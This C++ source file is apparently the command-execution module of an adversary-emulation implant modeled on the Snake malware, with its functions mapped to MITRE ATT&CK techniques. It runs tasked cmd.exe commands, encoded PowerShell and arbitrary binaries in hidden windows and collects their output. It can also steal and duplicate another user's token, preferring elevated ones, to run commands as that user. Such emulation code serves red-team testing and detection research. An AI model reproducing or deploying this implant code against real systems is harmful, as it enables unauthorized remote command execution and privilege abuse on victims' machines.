/*
 * Handle executing tasks
 * 
 * CTI references:
 * [1] https://artemonsecurity.com/snake_whitepaper.pdf
 */

#include "execute.h"

namespace execute {

/*
 * CreateTaskProcess:
 *      About:
 *          Create a process using the given command line. If provided a token handle, will create a process using that specified token.
 *      Result:
 *          Returns true on success, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *          T1134.002: Access Token Manipulation: Create Process with Token
 *      Other References:
 *          https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 *          https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
 *          https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
 *          https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
 *          https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)
 */
BOOL CreateTaskProcess(ApiWrapperInterface* api_wrapper, LPWSTR command_line, HANDLE runas_token, HANDLE h_output_pipe, PROCESS_INFORMATION* process_info) {
    STARTUPINFOW startup_info; // specify how to start process
    ZeroMemory(&startup_info, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = STARTF_USESTDHANDLES;
    startup_info.hStdOutput = h_output_pipe;
    startup_info.hStdError = h_output_pipe;
    if (runas_token == NULL) {
        return api_wrapper->CreateProcessWrapper(
            NULL, // module name included in command line
            command_line,
            NULL, 
            NULL,
            TRUE, // inherit our output pipe handle
            CREATE_NO_WINDOW, // dwCreationFlags
            NULL, // use environment of calling process
            NULL, // use current dir of calling process
            &startup_info,
            process_info
        );
    } else {
        return api_wrapper->CreateProcessWithTokenWrapper(
            runas_token,
            0,
            NULL, // module name included in command line
            command_line,
            CREATE_NO_WINDOW, // dwCreationFlags
            NULL, // use specified user's environment
            NULL, // use current dir of calling process
            &startup_info,
            process_info
        );
    }
}

// Get process output, wait for process to finish or timeout, and close process handles.
std::vector<char> GetProcessOutputAndCleanupTaskProcess(
    ApiWrapperInterface* api_wrapper, 
    HANDLE h_pipe_rd, 
    PROCESS_INFORMATION* process_info,
    DWORD timeout_seconds,
    DWORD* error_code
) {
    std::vector<char> v_output;
    DWORD exit_code;
    BOOL result;
    std::string log_msg;
    char response_buffer[PIPE_READ_BUFFER_SIZE];
    DWORD num_bytes_read = 0;
    DWORD total_bytes_read = 0;
    DWORD error;

    size_t total_time_waited = 0;
    DWORD wait_limit_ms = timeout_seconds * 1000;
    BOOL finished = FALSE;
    *error_code = ERROR_SUCCESS;
    do {
        DWORD wait_result = api_wrapper->WaitForSingleObjectWrapper(process_info->hProcess, WAIT_CHUNK_MS);
        total_time_waited += WAIT_CHUNK_MS;

        if (wait_result == WAIT_OBJECT_0) {
            // Process finished. Grab exit code
            finished = TRUE;
            if (!api_wrapper->GetExitCodeProcessWrapper(process_info->hProcess, &exit_code)) {
                *error_code = api_wrapper->GetLastErrorWrapper();
                log_msg = "Failed to get process exit code. Error code: " + std::to_string(*error_code);
                logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_ERROR, log_msg);
            } else {
                log_msg = "Process exited with exit code: " + std::to_string(exit_code);
                logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_INFO, log_msg);
            }
        } else if (wait_result == WAIT_FAILED) {
            *error_code = api_wrapper->GetLastErrorWrapper();
            log_msg = "Failed to wait for process. Error code: " + std::to_string(*error_code);
            logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_ERROR, log_msg);
            api_wrapper->CloseHandleWrapper(process_info->hProcess);
            api_wrapper->CloseHandleWrapper(process_info->hThread);
            return v_output;
        }

        // Process either finished or this current wait round elapsed. Read some output to free up buffers if needed.
        while(TRUE) {
            DWORD available = 0;

            // check if we have data available in the pipe
            if (!api_wrapper->PeekNamedPipeWrapper(h_pipe_rd, NULL, 0, NULL, &available, NULL)) {
                break;
            }
            if (!available) {
                break;
            }
            result = api_wrapper->ReadFileWrapper(
                h_pipe_rd,
                response_buffer,
                PIPE_READ_BUFFER_SIZE,
                &num_bytes_read,
                NULL
            );

            total_bytes_read += num_bytes_read;
            if (num_bytes_read > 0) {
                v_output.insert(v_output.end(), response_buffer, response_buffer + num_bytes_read);
            }
            if (!result) {
                error = api_wrapper->GetLastErrorWrapper();
                if (error == ERROR_BROKEN_PIPE) {
                    // End of pipe. Normal flow.
                    break;
                } else if (error != ERROR_MORE_DATA) {
                    *error_code = error;
                    log_msg = "Failed to read from output pipe. Error code: " + std::to_string(*error_code);
                    logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_ERROR, log_msg);
                    api_wrapper->CloseHandleWrapper(process_info->hProcess);
                    api_wrapper->CloseHandleWrapper(process_info->hThread);
                    return v_output;
                }
            }
        }

        if (total_time_waited >= wait_limit_ms) {
            logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_INFO, "Process timed out.");
            *error_code = FAIL_TIMEOUT_REACHED;
            finished = TRUE;
        }
    } while (!finished);
    api_wrapper->CloseHandleWrapper(process_info->hProcess);
    api_wrapper->CloseHandleWrapper(process_info->hThread);

    log_msg = "Received " + std::to_string(total_bytes_read) + " total output bytes from process.";
    logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_DEBUG, log_msg);
    return v_output;
}

// Reference: https://learn.microsoft.com/en-us/windows/win32/secbp/creating-a-dacl
DWORD CreateOutputPipeSecurityAttr(ApiWrapperInterface* api_wrapper, SECURITY_ATTRIBUTES* sa) {
    sa->nLength = sizeof(SECURITY_ATTRIBUTES);
    sa->bInheritHandle = TRUE;

    std::wstring dacl_str = std::wstring(L"D:") + // Discretionary ACL
        L"(D;OICI;GA;;;BG)" +      // Deny access to built-in guests
        L"(D;OICI;GA;;;AN)" +      // Deny access to anonymous logon
        L"(A;OICI;GRGWGX;;;AU)" +  // Allow RWX to authenticated users
        L"(A;OICI;GA;;;BA)";       // Allow full control to administrators

    BOOL result = api_wrapper->ConvertStringSecurityDescriptorToSecurityDescriptorWrapper(
        dacl_str.c_str(),
        SDDL_REVISION_1,
        &(sa->lpSecurityDescriptor),
        NULL
    );
    if (!result) {
        return api_wrapper->GetLastErrorWrapper();
    }
    return ERROR_SUCCESS;
}

/*
 * ExecuteProcess:
 *      About:
 *          Create a process using the given command line and return its output. 
 *          If provided a username, it will attempt to create a process using a copy of that user's token (elevated tokens prioritized).
 *          If no token is found for that user, the process will inherit the current context.
 *      Result:
 *          Returns a char vector of process output on success. error_code will be populated with ERROR_SUCCESS on success, otherwise
 *          some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *          T1134.002: Access Token Manipulation: Create Process with Token
 *          T1057: Process Discovery
 *          T1134.001: Access Token Manipulation: Token Impersonation/Theft
 *          T1559: Inter-Process Communication
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output
 */
std::vector<char> ExecuteProcess(
    ApiWrapperInterface* api_wrapper,
    LPWSTR command_line,
    std::wstring runas_user,
    DWORD timeout_seconds,
    DWORD* error_code
) {
    std::vector<char> output;
    std::string log_msg;
    HANDLE runas_token = NULL;

    // Allow our pipe handle to be inherited and set lax security attributes
    SECURITY_ATTRIBUTES pipe_sa; 
    *error_code = CreateOutputPipeSecurityAttr(api_wrapper, &pipe_sa);
    if (*error_code != ERROR_SUCCESS) {
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to set security attribute struct for output pipe. Error code: " + std::to_string(*error_code)
        );
        return output;
    }

    // Create named pipe for retrieve output
    HANDLE h_pipe_output_rd = NULL;
    HANDLE h_pipe_output_wr = NULL;
    if (!api_wrapper->CreatePipeWrapper(&h_pipe_output_rd, &h_pipe_output_wr, &pipe_sa, 0)) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        log_msg = "Failed to create pipe for process stdout. Error code: " + std::to_string(*error_code);
        logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_ERROR, log_msg);
        return output;
    }
    if (api_wrapper->LocalFreeWrapper(pipe_sa.lpSecurityDescriptor) != NULL) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        api_wrapper->CloseHandleWrapper(h_pipe_output_wr);
        api_wrapper->CloseHandleWrapper(h_pipe_output_rd);
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to free memory for pipe security descriptor. Error code: " + std::to_string(*error_code)
        );
        return output;
    }

    // Set pipe handle
    if (!api_wrapper->SetHandleInformationWrapper(h_pipe_output_rd, HANDLE_FLAG_INHERIT, 0)) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        api_wrapper->CloseHandleWrapper(h_pipe_output_wr);
        api_wrapper->CloseHandleWrapper(h_pipe_output_rd);
        log_msg = "Failed to set handle for stdout pipe. Error code: " + std::to_string(*error_code);
        logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_ERROR, log_msg);
        return output;
    }

    // If specified to run as a different user, duplicate a token from a process running under that user
    if (runas_user.length() > 0) {
        DWORD duplicate_result = GetRunasToken(api_wrapper, runas_user, &runas_token);
        if (duplicate_result == ERROR_SUCCESS) {
            logging::LogMessage(
                api_wrapper, 
                LOG_EXECUTION, 
                LOG_LEVEL_INFO, 
                "Successfully obtained elevated duplicated token to start process as target user " + util::ConvertWstringToString(runas_user)
            );
        } else if (duplicate_result == FAIL_FIND_TARGET_USER_ELEVATED_PROC) {
            logging::LogMessage(
                api_wrapper, 
                LOG_EXECUTION, 
                LOG_LEVEL_INFO, 
                "Obtained non-elevated duplicated token to start process as target user " + util::ConvertWstringToString(runas_user)
            );
        } else {
            logging::LogMessage(
                api_wrapper, 
                LOG_EXECUTION, 
                LOG_LEVEL_ERROR, 
                "Failed to get duplicated token to start process as target user " + util::ConvertWstringToString(runas_user) + ". Error code: " + std::to_string(duplicate_result)
            );
            if (runas_token != NULL) {
                api_wrapper->CloseHandleWrapper(runas_token);
            }
            runas_token = NULL;
        }
    }

    // Create process, output to pipe we created
    PROCESS_INFORMATION process_info; // for created process
    BOOL proc_create_result = CreateTaskProcess(api_wrapper, command_line, runas_token, h_pipe_output_wr, &process_info);
    if (!proc_create_result) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        if (runas_token != NULL) api_wrapper->CloseHandleWrapper(runas_token);
        api_wrapper->CloseHandleWrapper(h_pipe_output_rd);
        api_wrapper->CloseHandleWrapper(h_pipe_output_wr); 
        log_msg = "Failed to create process. Error code: " + std::to_string(*error_code);
        logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_ERROR, log_msg);
        return output;
    }

    if (runas_token == NULL) {
        log_msg = "Created process with ID " + std::to_string(process_info.dwProcessId) + " and command " + util::ConvertWstringToString(command_line);
    } else {
        log_msg = "Created process with ID " + std::to_string(process_info.dwProcessId) + " to run as user " + util::ConvertWstringToString(runas_user);
        log_msg += ". Command: " + util::ConvertWstringToString(command_line);
    }
    logging::LogMessage(api_wrapper, LOG_EXECUTION, LOG_LEVEL_INFO, log_msg);

    // Get process output and wait for it to finish
    output = GetProcessOutputAndCleanupTaskProcess(api_wrapper, h_pipe_output_rd, &process_info, timeout_seconds, error_code);
    api_wrapper->CloseHandleWrapper(h_pipe_output_wr);
    api_wrapper->CloseHandleWrapper(h_pipe_output_rd);
    if (runas_token != NULL) api_wrapper->CloseHandleWrapper(runas_token);
    return output;
}

/*
 * ExecuteCmdCommand:
 *      About:
 *          Create a cmd.exe process using the given command line and return its output. 
 *          If provided a username, it will attempt to create a process using a copy of that user's token (elevated tokens prioritized).
 *          If no token is found for that user, the process will inherit the current context.
 *      Result:
 *          Returns a char vector of process output on success. error_code will be populated with ERROR_SUCCESS on success, otherwise
 *          some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1059.003: Command and Scripting Interpreter: Windows Command Shell
 *          T1106: Native API
 *          T1134.002: Access Token Manipulation: Create Process with Token
 *          T1057: Process Discovery
 *          T1134.001: Access Token Manipulation: Token Impersonation/Theft
 *          T1559: Inter-Process Communication
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output
 */
std::vector<char> ExecuteCmdCommand(
    ApiWrapperInterface* api_wrapper,
    LPCWSTR command, 
    std::wstring runas_user,
    DWORD timeout_seconds,
    DWORD* error_code
) {
    wchar_t command_line[MAX_CMD_LINE_LENGTH + 1];
    if (wcslen(command) > MAX_CMD_LINE_LENGTH) {
        *error_code = FAIL_CMDLINE_TOO_LONG;
        return std::vector<char>();
    }
    swprintf_s(command_line, MAX_CMD_LINE_LENGTH, L"%s /c %s", EXECUTOR_PATH_CMD, command); // cmd.exe /c ...
    return ExecuteProcess(api_wrapper, command_line, runas_user, timeout_seconds, error_code);
}

/*
 * ExecutePshCommand:
 *      About:
 *          Create a powershell.exe process using the given command line and return its output. 
 *          If provided a username, it will attempt to create a process using a copy of that user's token (elevated tokens prioritized).
 *          If no token is found for that user, the process will inherit the current context.
 *      Result:
 *          Returns a char vector of process output on success. error_code will be populated with ERROR_SUCCESS on success, otherwise
 *          some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1059.001: Command and Scripting Interpreter: PowerShell
 *          T1106: Native API
 *          T1134.002: Access Token Manipulation: Create Process with Token
 *          T1057: Process Discovery
 *          T1134.001: Access Token Manipulation: Token Impersonation/Theft
 *          T1559: Inter-Process Communication
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output
 */
std::vector<char> ExecutePshCommand(
    ApiWrapperInterface* api_wrapper,
    LPCWSTR command, 
    std::wstring runas_user,
    DWORD timeout_seconds,
    DWORD* error_code
) {
    wchar_t command_line[MAX_CMD_LINE_LENGTH + 1];
    if (wcslen(command) > MAX_CMD_LINE_LENGTH) {
        *error_code = FAIL_CMDLINE_TOO_LONG;
        return std::vector<char>();
    }
    swprintf_s(command_line, MAX_CMD_LINE_LENGTH, L"%s -nol -noni -nop -enc %s", EXECUTOR_PATH_PSH, command); // powershell.exe -nolohgo -noninteractive -noprofile -enc ...
    return ExecuteProcess(api_wrapper, command_line, runas_user, timeout_seconds, error_code);
}

/*
 * ExecuteProcCommand:
 *      About:
 *          Create a given process using the given command line and return its output. 
 *          If provided a username, it will attempt to create a process using a copy of that user's token (elevated tokens prioritized).
 *          If no token is found for that user, the process will inherit the current context.
 *      Result:
 *          Returns a char vector of process output on success. error_code will be populated with ERROR_SUCCESS on success, otherwise
 *          some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *          T1134.002: Access Token Manipulation: Create Process with Token
 *          T1057: Process Discovery
 *          T1134.001: Access Token Manipulation: Token Impersonation/Theft
 *          T1559: Inter-Process Communication
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output
 */
std::vector<char> ExecuteProcCommand(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR binary_path, 
    LPCWSTR proc_args, 
    std::wstring runas_user,
    DWORD timeout_seconds, 
    DWORD* error_code
) {
    wchar_t command_line[MAX_CMD_LINE_LENGTH + 1];
    if (wcslen(binary_path) + wcslen(proc_args) + 3 > MAX_CMD_LINE_LENGTH) {
        *error_code = FAIL_CMDLINE_TOO_LONG;
        return std::vector<char>();
    }
    if (wcslen(proc_args) == 0) {
        swprintf_s(command_line, MAX_CMD_LINE_LENGTH, L"\"%s\"", binary_path);
    } else {
        swprintf_s(command_line, MAX_CMD_LINE_LENGTH, L"\"%s\" %s", binary_path, proc_args);
    }
    return ExecuteProcess(api_wrapper, command_line, runas_user, timeout_seconds, error_code);
}

} // namespace execute
